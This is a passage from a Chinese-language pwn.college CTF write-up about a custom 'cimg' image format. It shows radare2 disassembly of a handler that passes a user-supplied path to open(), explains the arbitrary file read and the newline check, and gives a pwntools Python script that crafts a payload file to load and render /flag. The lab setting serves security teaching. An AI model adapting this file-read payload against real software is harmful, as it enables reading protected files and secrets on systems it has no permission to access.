class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">┌ 363: sym.handle_5 (int64_t arg1, int64_t arg5);</span><br><span class="line">│ `- args(rdi, r8) vars(5:sp[0x30..0x133])</span><br><span class="line">│           0x00401a3e      f30f1efa       endbr64</span><br><span class="line">│           0x00401a42      4155           push r13</span><br><span class="line">│           0x00401a44      b903010000     mov ecx, 0x103              ; 259</span><br><span class="line">│           0x00401a49      4183c8ff       or r8d, 0xffffffff          ; -1 ; arg5</span><br><span class="line">│           0x00401a4d      ba02010000     mov edx, 0x102              ; 258 ; size_t nbyte</span><br><span class="line">│           0x00401a52      4154           push r12</span><br><span class="line">│           0x00401a54      4989fc         mov r12, rdi                ; arg1</span><br><span class="line">│           0x00401a57      55             push rbp</span><br><span class="line">│           0x00401a58      53             push rbx</span><br><span class="line">│           0x00401a59      4881ec1801..   sub rsp, 0x118</span><br><span class="line">│           0x00401a60      64488b0425..   mov rax, qword fs:[0x28]</span><br><span class="line">│           0x00401a69      4889842408..   mov qword [canary], rax</span><br><span class="line">│           0x00401a71      31c0           xor eax, eax</span><br><span class="line">│           0x00401a73      488d7c2405     lea rdi, [var_5h]</span><br><span class="line">│           0x00401a78      488d742405     lea rsi, [var_5h]           ; void *buf</span><br><span class="line">│           0x00401a7d      f3aa           rep stosb byte [rdi], al</span><br><span class="line">│           0x00401a7f      31ff           xor edi, edi                ; int fildes</span><br><span class="line">│           0x00401a81      488d0db906..   lea rcx, str.ERROR:_Failed_to_read_sprite_load_record_ ; 0x402141 ; &quot;ERROR: Failed to read &amp;sprite_load_record!&quot; ; int64_t arg4</span><br><span class="line">│           0x00401a88      e889faffff     call sym.read_exact</span><br><span class="line">│           0x00401a8d      668b542406     mov dx, word [var_6h]</span><br><span class="line">│           0x00401a92      0fb6442405     movzx eax, byte [var_5h]</span><br><span class="line">│           0x00401a97      31f6           xor esi, esi                ; int oflag</span><br><span class="line">│           0x00401a99      488d7c2408     lea rdi, [path]             ; const char *path</span><br><span class="line">│           0x00401a9e      86f2           xchg dl, dh</span><br><span class="line">│           0x00401aa0      48c1e004       shl rax, 4</span><br><span class="line">│           0x00401aa4      664189540418   mov word [r12 + rax + 0x18], dx</span><br><span class="line">│           0x00401aaa      31c0           xor eax, eax</span><br><span class="line">│           0x00401aac      e86ff7ffff     call sym.imp.open           ; int open(const char *path, int oflag)</span><br><span class="line">│           0x00401ab1      85c0           test eax, eax</span><br><span class="line">│       ┌─&lt; 0x00401ab3      7915           jns 0x401aca</span><br><span class="line">│       │   0x00401ab5      488b35e472..   mov rsi, qword [obj.stderr] ; obj.stderr__GLIBC_2.2.5</span><br><span class="line">│       │                                                              ; [0x408da0:8]=0 ; FILE *stream</span><br><span class="line">│       │   0x00401abc      488d3da906..   lea rdi, str.ERROR:_failed_to_open_sprite_file_n ; 0x40216c ; &quot;ERROR: failed to open sprite file\n&quot; ; const char *s</span><br><span class="line">│       │   0x00401ac3      e8d8f6ffff     call sym.imp.fputs          ; int fputs(const char *s, FILE *stream)</span><br><span class="line">│      ┌──&lt; 0x00401ac8      eb45           jmp 0x401b0f</span><br><span class="line">│      ││   ; CODE XREF from sym.handle_5 @ 0x401ab3(x)</span><br><span class="line">│      │└─&gt; 0x00401aca      89c5           mov ebp, eax</span><br><span class="line">│      │    0x00401acc      0fb6442405     movzx eax, byte [var_5h]</span><br><span class="line">│      │    0x00401ad1      48c1e004       shl rax, 4</span><br><span class="line">│      │    0x00401ad5      4a8b7c2020     mov rdi, qword [rax + r12 + 0x20]</span><br><span class="line">│      │    0x00401ada      4885ff         test rdi, rdi</span><br><span class="line">│      │┌─&lt; 0x00401add      7405           je 0x401ae4</span><br><span class="line">│      ││   0x00401adf      e86cf6ffff     call sym.imp.free           ; void free(void *ptr)</span><br><span class="line">│      ││   ; CODE XREF from sym.handle_5 @ 0x401add(x)</span><br><span class="line">│      │└─&gt; 0x00401ae4      440fb66c2406   movzx r13d, byte [var_6h]</span><br><span class="line">│      │    0x00401aea      0fb6542407     movzx edx, byte [var_7h]</span><br><span class="line">│      │    0x00401aef      440fafea       imul r13d, edx</span><br><span class="line">│      │    0x00401af3      4963fd         movsxd rdi, r13d            ; size_t size</span><br><span class="line">│      │    0x00401af6      e8f5f6ffff     call sym.imp.malloc         ;  void *malloc(size_t size)</span><br><span class="line">│      │    0x00401afb      4889c3         mov rbx, rax</span><br><span class="line">│      │    0x00401afe      4885c0         test rax, rax</span><br><span class="line">│      │┌─&lt; 0x00401b01      7514           jne 0x401b17</span><br><span class="line">│      ││   0x00401b03      488d3dfa04..   lea rdi, str.ERROR:_Failed_to_allocate_memory_for_the_image_data_ ; 0x402004 ; &quot;ERROR: Failed to allocate memory for the image data!&quot; ; const char *s</span><br><span class="line">│      ││   0x00401b0a      e851f6ffff     call sym.imp.puts           ; int puts(const char *s)</span><br><span class="line">│      ││   ; CODE XREFS from sym.handle_5 @ 0x401ac8(x), 0x401b6c(x)</span><br><span class="line">│     ┌└──&gt; 0x00401b0f      83cfff         or edi, 0xffffffff          ; -1</span><br><span class="line">│     ╎ │   0x00401b12      e819f7ffff     call sym.imp.exit           ; void exit(int status)</span><br><span class="line">│     ╎ │   ; CODE XREF from sym.handle_5 @ 0x401b01(x)</span><br><span class="line">│     ╎ └─&gt; 0x00401b17      4489ea         mov edx, r13d               ; size_t nbyte</span><br><span class="line">│     ╎     0x00401b1a      4889c6         mov rsi, rax                ; void *buf</span><br><span class="line">│     ╎     0x00401b1d      4183c8ff       or r8d, 0xffffffff          ; -1</span><br><span class="line">│     ╎     0x00401b21      89ef           mov edi, ebp                ; int fildes</span><br><span class="line">│     ╎     0x00401b23      488d0d0f05..   lea rcx, str.ERROR:_Failed_to_read_data_ ; 0x402039 ; &quot;ERROR: Failed to read data!&quot; ; int64_t arg4</span><br><span class="line">│     ╎     0x00401b2a      e8e7f9ffff     call sym.read_exact</span><br><span class="line">│     ╎     0x00401b2f      0fb6442407     movzx eax, byte [var_7h]</span><br><span class="line">│     ╎     0x00401b34      0fb6542406     movzx edx, byte [var_6h]</span><br><span class="line">│     ╎     0x00401b39      0fafd0         imul edx, eax</span><br><span class="line">│     ╎     0x00401b3c      31c0           xor eax, eax</span><br><span class="line">│     ╎     ; CODE XREF from sym.handle_5 @ 0x401b50(x)</span><br><span class="line">│     ╎ ┌─&gt; 0x00401b3e      39c2           cmp edx, eax</span><br><span class="line">│     ╎┌──&lt; 0x00401b40      7e2c           jle 0x401b6e</span><br><span class="line">│     ╎│╎   0x00401b42      0fb60c03       movzx ecx, byte [rbx + rax]</span><br><span class="line">│     ╎│╎   0x00401b46      48ffc0         inc rax</span><br><span class="line">│     ╎│╎   0x00401b49      8d71e0         lea esi, [rcx - 0x20]</span><br><span class="line">│     ╎│╎   0x00401b4c      4080fe5e       cmp sil, 0x5e               ; &#x27;^&#x27; ; 94</span><br><span class="line">│     ╎│└─&lt; 0x00401b50      76ec           jbe 0x401b3e</span><br><span class="line">│     ╎│    0x00401b52      488b3d4772..   mov rdi, qword [obj.stderr] ; obj.stderr__GLIBC_2.2.5</span><br><span class="line">│     ╎│                                                               ; [0x408da0:8]=0</span><br><span class="line">│     ╎│    0x00401b59      488d15f504..   lea rdx, str.ERROR:_Invalid_character_0x_x_in_the_image_data__n ; str.ERROR:_Invalid_character_0x_x_in_the_image_data__n</span><br><span class="line">│     ╎│                                                               ; 0x402055 ; &quot;ERROR: Invalid character 0x%x in the image data!\n&quot;</span><br><span class="line">│     ╎│    0x00401b60      be01000000     mov esi, 1</span><br><span class="line">│     ╎│    0x00401b65      31c0           xor eax, eax</span><br><span class="line">│     ╎│    0x00401b67      e8d4f6ffff     call sym.imp.__fprintf_chk</span><br><span class="line">│     └───&lt; 0x00401b6c      eba1           jmp 0x401b0f</span><br><span class="line">│      │    ; CODE XREF from sym.handle_5 @ 0x401b40(x)</span><br><span class="line">│      └──&gt; 0x00401b6e      0fb6442405     movzx eax, byte [var_5h]</span><br><span class="line">│           0x00401b73      89ef           mov edi, ebp                ; int fildes</span><br><span class="line">│           0x00401b75      48c1e004       shl rax, 4</span><br><span class="line">│           0x00401b79      4a895c2020     mov qword [rax + r12 + 0x20], rbx</span><br><span class="line">│           0x00401b7e      e82df6ffff     call sym.imp.close          ; int close(int fildes)</span><br><span class="line">│           0x00401b83      488b842408..   mov rax, qword [canary]</span><br><span class="line">│           0x00401b8b      6448330425..   xor rax, qword fs:[0x28]</span><br><span class="line">│       ┌─&lt; 0x00401b94      7405           je 0x401b9b</span><br><span class="line">│       │   0x00401b96      e8e5f5ffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)</span><br><span class="line">│       │   ; CODE XREF from sym.handle_5 @ 0x401b94(x)</span><br><span class="line">│       └─&gt; 0x00401b9b      4881c41801..   add rsp, 0x118</span><br><span class="line">│           0x00401ba2      5b             pop rbx</span><br><span class="line">│           0x00401ba3      5d             pop rbp</span><br><span class="line">│           0x00401ba4      415c           pop r12</span><br><span class="line">│           0x00401ba6      415d           pop r13</span><br><span class="line">└           0x00401ba8      c3             ret</span><br></pre></td></tr></table></figure>
-<p>任意文件读取漏洞 (Arbitrary File Read / Local File Inclusion) in
-handle_5</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x00401a4d  mov edx, 0x102       ; 准备读取 258 字节</span><br><span class="line">0x00401a88  call sym.read_exact  ; 从标准输入读取 Payload</span><br></pre></td></tr></table></figure>
-<p>它读取了 258 个字节的
-<code>sprite_load_record</code>。通过偏移量分析，它的结构是：</p>
-<ul>
-<li><code>ID</code> (1 byte)</li>
-<li><code>Width</code> (1 byte)</li>
-<li><code>Height</code> (1 byte)</li>
-<li><strong><code>Path</code> (255 bytes)</strong>
-直接把字符串传给了底层的 <code>open(path, 0)</code></li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x00401b4c  cmp sil, 0x5e        ; 校验字符是否在 0x20 ~ 0x7E 之间</span><br><span class="line">0x00401b50  jbe 0x401b3e         ; 如果是，继续循环；否则报错退出</span><br></pre></td></tr></table></figure>
-<p>标准读取时，如果读到了换行符 (<code>\n</code>，十六进制
-<code>0x0A</code>)，程序会抛出 <code>ERROR: Invalid character</code>
-并退出。而 <code>/flag</code> 文件的末尾有一个换行符</p>
-<p>既然我们知道 <code>read_exact</code> 只有在读到指定长度
-(<code>Width * Height</code>) 时才会返回，我们只需要让
-<code>Width</code> 等于 Flag 字符串的长度（不包含换行符）。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    binary_path = <span class="string">&quot;/challenge/cimg&quot;</span></span><br><span class="line"></span><br><span class="line">    flag_len = <span class="number">59</span> <span class="comment"># known flag length</span></span><br><span class="line">    payload = <span class="built_in">bytearray</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1. Header: Version 4, 画布大小 100x1, 2 个指令</span></span><br><span class="line">    payload += struct.pack(<span class="string">&quot;&lt;4sHBBI&quot;</span>, <span class="string">b&quot;cIMG&quot;</span>, <span class="number">4</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. Directive 1 -&gt; handle_5: 任意文件加载</span></span><br><span class="line">    payload += struct.pack(<span class="string">&quot;&lt;H&quot;</span>, <span class="number">5</span>)  <span class="comment"># Opcode 5</span></span><br><span class="line">    payload += struct.pack(<span class="string">&quot;&lt;BBB&quot;</span>, <span class="number">1</span>, flag_len, <span class="number">1</span>)  <span class="comment"># ID=1, Width=flag_len, Height=1</span></span><br><span class="line">    path = <span class="string">b&quot;/flag&quot;</span>.ljust(<span class="number">255</span>, <span class="string">b&quot;\x00&quot;</span>)  <span class="comment"># 恶意路径，Null截断</span></span><br><span class="line">    payload += path</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. Directive 2 -&gt; handle_4: 渲染到屏幕</span></span><br><span class="line">    <span class="comment"># 参数: Opcode(4), ID(1), R(255), G(255), B(255), X(0), Y(0), RepeatX(1), RepeatY(1), Trans(0)</span></span><br><span class="line">    payload += struct.pack(<span class="string">&quot;&lt;HBBBBBBBBB&quot;</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    file_name = <span class="string">&quot;exploit_payload.cimg&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(payload)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 执行二进制</span></span><br><span class="line">        p = process([binary_path, file_name])</span><br><span class="line">        out = p.recvall(timeout=<span class="number">1</span>).decode(errors=<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;ERROR&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> out:</span><br><span class="line">            <span class="comment"># 用正则剥离 ANSI 颜色</span></span><br><span class="line">            clean_text = re.sub(<span class="string">r&quot;\x1b\[.*?m&quot;</span>, <span class="string">&quot;&quot;</span>, out)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;pwn.college&quot;</span> <span class="keyword">in</span> clean_text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\n[+] Success Flag length: <span class="subst">&#123;flag_len&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[*] Raw Flag: <span class="subst">&#123;clean_text.strip()&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] Exploit failed.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exploit()</span><br></pre></td></tr></table></figure>
 
       
     </div>
